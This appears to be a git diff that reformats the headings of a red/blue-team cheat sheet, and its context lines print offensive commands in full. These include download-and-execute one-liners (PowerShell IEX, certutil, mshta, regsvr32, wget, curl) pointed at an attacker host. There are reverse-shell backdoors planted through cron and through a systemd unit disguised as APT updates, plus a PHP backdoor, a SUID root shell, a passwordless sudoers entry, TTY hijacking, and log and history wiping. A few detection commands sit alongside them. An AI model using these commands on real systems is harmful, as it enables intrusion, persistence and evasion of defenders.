@@ -11,17 +11,17 @@ powershell "IEX( IWR http://10.10.10.10:9999 -UseBasicParsing)"
 powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:9999/test.bat'))
 ```
 
-Certutil:
+**Certutil:**
 ```
 certutil -urlcache -f http://10.10.10.10:9999/shell.exe shell.exe
 ```
 
-Mshta:
+**Mshta:**
 ```
 mshta http://10.10.10.10:9999/rev.hta
 mshta vbscript:Close(Execute("GetObject(""script:http://10.10.10.10:9999/rev.sct"")"))
 ```
-Create custom .hta file
+**Create custom .hta file:**
 ```
 <html>
 <head>
@@ -37,11 +37,11 @@ Create custom .hta file
 </html>
 ```
 
-Regsvr32:
+**Regsvr32:**
 ```
 regsvr32 /s /n /u /i:http://10.10.10.10:9999/rev.sct scrobj.dll
 ```
-Create custom .sct file
+**Create custom .sct file:**
 ```
 <?XML version="1.0"?>
 <scriptlet>
@@ -55,51 +55,51 @@ Create custom .sct file
 </scriptlet>
 ```
 
-Msiexec:
+**Msiexec:**
 ```
 msiexec /q /i http://10.10.10.10:9999/rev.msi
 ```
 
-Wmic:
+**Wmic:**
 ```
 wmic os get /FORMAT:"http://10.10.10.10:9999/rev.xsl"
 ```
 
 # File Transfers (Linux)
 
-Wget:
+**Wget:**
 ```
 wget http://10.10.10.10:9999/file.sh -O /tmp/file.sh
 ```
-Curl:
+**Curl:**
 ```
 curl http://10.10.10.10:9999/file.sh -o /tmp/file.sh
 ```
-Python
+**Python:**
 ```
 python -c "import urllib; f = urllib.URLopener(); f.retrieve('http://10.10.10.10:9999/rev.exe', '/tmp/rev.exe');"
 ```
-Perl
+**Perl:**
 ```
 perl -e 'use File::Fetch; my $ff=File::Fetch->new(uri => "http://10.10.10.10:9999/rev.sh"); my $file = $ff->fetch() or die $ff->error;'
 ```
-PHP
+**PHP:**
 ```
 echo "<?php file_put_contents('nameOfFile', fopen('http://10.10.10.10:9999/shell.php', 'r')); ?>" > shell.php
 ```
-Netcat:
+**Netcat:**
 ```
 Victim: nc -l -p 4444 > file.sh
 Attacker: nc -w 3 10.10.10.20 4444 < file.sh
 ```
-FreeBSD:
+**FreeBSD:**
 ```
 fetch 10.10.10.10:9999/shell.py
 ```
 
 # Handy Scripts & Commands (Linux) Red/Blue Team Operations:
 
-Monitor processes in real-time *Thanx to Ippsec 
+**Monitor processes in real-time *Thanx to Ippsec:** 
 ```
 #!/bin/bash
 
@@ -113,78 +113,78 @@ while true; do
   old_process=$new_process
 done
 ```
-Detecting Possible Reverse Shells:
+**Detecting Possible Reverse Shells:**
 ```
 ss -antp | grep ESTAB
 netstat -antp | grep ESTABLISHED
 ps -aef --forest
 netstat -nputw
 ```
-Detecting Reverse Shell in Web Server Logs
+**Detecting Reverse Shell in Web Server Logs:**
 ```
 cat /var/log/apache2/access.log | awk -F\" ' { print $1,$2 } ' | grep "file"
 ```
-Find Dangerous PHP functions() in any php file in the web root
+**Find Dangerous Code functions() in any file in the web root:**
 ```
 grep -RPn "(passthru|exec|eval|shell_exec|assert|str_rot13|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readfile) *\("
 ```
-Find files modified in the last 15 min in the web root
+**Find files modified in the last 15 min in the web root:**
 ```
 find /var/www/html/ -type f -ls -mtime -15 2>/dev/null
 ```
-Find files modified in the last 15 min on the entire system
+**Find files modified in the last 15 min on the entire system:**
 ```
 find / -type f -mtime -15 -ls 2>/dev/null | grep -v ' /sys\| /proc\| /run'
 ```
-Find files modifiled in the last 15 min on a users home directory
+**Find files modifiled in the last 15 min on a users home directory:**
 ```
 find /home/max -type f -mtime -15 -ls 2>/dev/null
 ```
-Find all files that a specific user owns
+**Find all files that a specific user owns:**
 ```
 find / -user www-data -ls 2>/dev/null
 ```
-Find files owned by a specific group
+**Find files owned by a specific group:**
 ```
 find / -group sysadmins -ls 2>/dev/null
 ```
 
-See what Users are doing in their TTY/PTS
+**See what Users are doing in their TTY/PTS:**
 ```
 ps -aef --forest
 ps -aef --forest | grep <user>
 ```
-Spam Someone's TTY/PTS
+**Spam Someone's TTY/PTS:**
 ```
 Get your tty
 tty
 ```
-Echo text into the TTY/PTS
+**Echo text into the TTY/PTS:**
 ```
 echo "I C You" > /dev/pts/<tty_number>
 ```
-Echo text into all TTY/PTS
+**Echo text into all TTY/PTS:**
 ```
 for i in {1..10}; do echo "I C You" > /dev/pts/$i; done
 ```
-Run commands on their behalf (Hook to their TTY/PTS)
+**Run commands on their behalf (Hook to their TTY/PTS):**
 ```
 script /dev/pts/<tty_number>
 ```
-Spam the TTY/PTS
+**Spam the TTY/PTS:**
 ```
 cat /dev/urandom > /dev/pts/<tty_number>
 ```
-Spam all TTY/PTS except yours
+**Spam all TTY/PTS except yours:**
 ```
 tty
 for i in {2..10}; do cat /dev/urandom > /dev/pts/$i; done
 ```
-Linux Cron Job Backdoor(Spits out Reverse Shell every 5 mins)
+**Linux Cron Job Backdoor(Spits out Reverse Shell every 5 mins):**
 ```
 */5 * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/9999 0>&1'
 ```
-Malicious PHP Backdoor to trigger reverse shell (/var/www/html/file.php)
+**Malicious PHP Backdoor to trigger reverse shell (/var/www/html/file.php):**
 ```
 Victim (Create local PHP file with the below contents)
 
@@ -194,19 +194,19 @@ Attacker
 nc -lvnp 9999
 curl 'http://10.10.10.10/file.php?ip=192.168.0.108&port=9999'
 ```
-Sudo rights to any user with no password (/etc/sudoers)
+**Sudo rights to any user with no password (/etc/sudoers):**
 ```
 max ALL=(ALL) NOPASSWD:ALL
 ```
-Resetting the root password
+**Resetting the root password:**
 ```
 echo "root:$Iloveshells$" | chpasswd
 ```
-Link Bash history to /dev/null
+**Link Bash history to /dev/null:**
 ```
 ln -sf /dev/null ~/.bash_history
 ```
-Reverse Shell backdoor via systemd (/etc/systemd/system/updates.service)
+**Reverse Shell backdoor via systemd (/etc/systemd/system/updates.service):**
 ```
 Description=Linux APT Updates.
 
@@ -216,7 +216,7 @@ ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/9999 0>&1'
 
 WantedBy=multi-user.target
 ```
-Root Shell via C SUID
+**Root Shell via C SUID:**
 ```
 echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > priv.c
 gcc priv.c -o shell
@@ -224,7 +224,7 @@ rm priv.c
 chmod +s shell
 /shell
 ```
-Reverse Shell via C SUID (rev.c)
+**Reverse Shell via C SUID (rev.c):**
 ```
 #include<unistd.h>
 
@@ -240,15 +240,15 @@ rm rev.c
 chmod +x rev
 ./rev
 ```
-Linux
+**Linux:**
 ```
 for i in {1..254}; do ping -c 1 -W 1 10.10.10.$i | grep 'from'; done
 ```
-Windows
+**Windows:**
 ```
 1..254 | % {"10.10.10.$($_): $(Test-Connection -count 1 -comp 10.10.10.$($_) -quiet)"}
 ```
-Python
+**Python:**
 ```
 #!/usr/bin/python
 import multiprocessing, subprocess, os
@@ -284,15 +284,15 @@ if __name__ == '__main__':
         ip = results.get()
         print(ip)
 ```
-Port Scan with Netcat
+**Port Scan with Netcat:**
 ```
 nc -zv 10.10.10.10 1-1023
 ```
-Port Scan with Curl
+**Port Scan with Curl:**
 ```
 curl http://10.10.10.10:[1-1024]
 ```
-Port Scan with Bash
+**Port Scan with Bash:**
 ```
 #!/bin/bash
 
@@ -303,7 +303,7 @@ for port in {1..1023};
    
  done
 ```
-Clear Common Event Logs
+**Clear Common Event Logs:**
 ```
 #!/bin/bash
 
@@ -317,7 +317,7 @@ echo '' > /var/log/messages
 rm -rf /tmp/*
 rm -rf /dev/shm/*
 ```
-Lock Critical Writable Files
+**Lock Critical Writable Files:**
 ```
 #!/bin/bash
 
@@ -334,7 +334,7 @@ chmod o-x /sbin/reboot
 chmod o-x /bin/systemctl
 ```
 
-Unlock Critical Writable Files
+**Unlock Critical Writable Files:**
 ```
 #!/bin/bash
 
